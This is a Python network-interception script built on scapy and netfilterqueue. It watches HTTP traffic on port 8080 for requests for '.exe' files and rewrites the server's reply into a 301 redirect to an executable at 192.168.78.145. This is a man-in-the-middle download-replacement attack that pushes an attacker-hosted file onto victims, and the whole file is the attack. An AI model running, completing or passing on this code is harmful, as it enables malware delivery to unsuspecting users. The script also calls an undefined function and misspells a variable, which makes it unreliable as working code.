#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

daftarack = []
def load_nuz(kardus, load):
    kardus[scapy.Raw].load = load
    del kardus[scapy.IP].len
    del kardus[scapy.IP].chksum
    del kardus[scapy.TCP].chksum
    return kardus
def proseskardus_nuz(kardus):
    kardusscapy = scapy.IP(kardus.get_payload())
    if kardusscapy.haslayer(scapy.TCP):
        if kardusscapy[scapy.TCP].dport == 8080:
            if b".exe" in kardusscapy[scapy.Raw].load and b"192.168.78.145" not in kardusscapy[scapy.Raw].load:
                print("minta .exe")
                daftarack.append(kardusscapy[scapy.TCP].ack)

        elif kardusscapy[scapy.TCP].sport == 8080:
            print("respon HTTP")
            if kkardusscapy[scapy.TCP].seq in daftarack:
                daftarack.remove(kardusscapy[scapy.TCP].seq)
                print("MODIFIKASI FILE...")
                modifkardus = set_load(kardusscapy, "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.78.145/file_nuz/1mb.exe\n\n")

                kardus.set_payload(bytes(modifkardus))

    kardus.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, proseskardus_nuz)
queue.run()

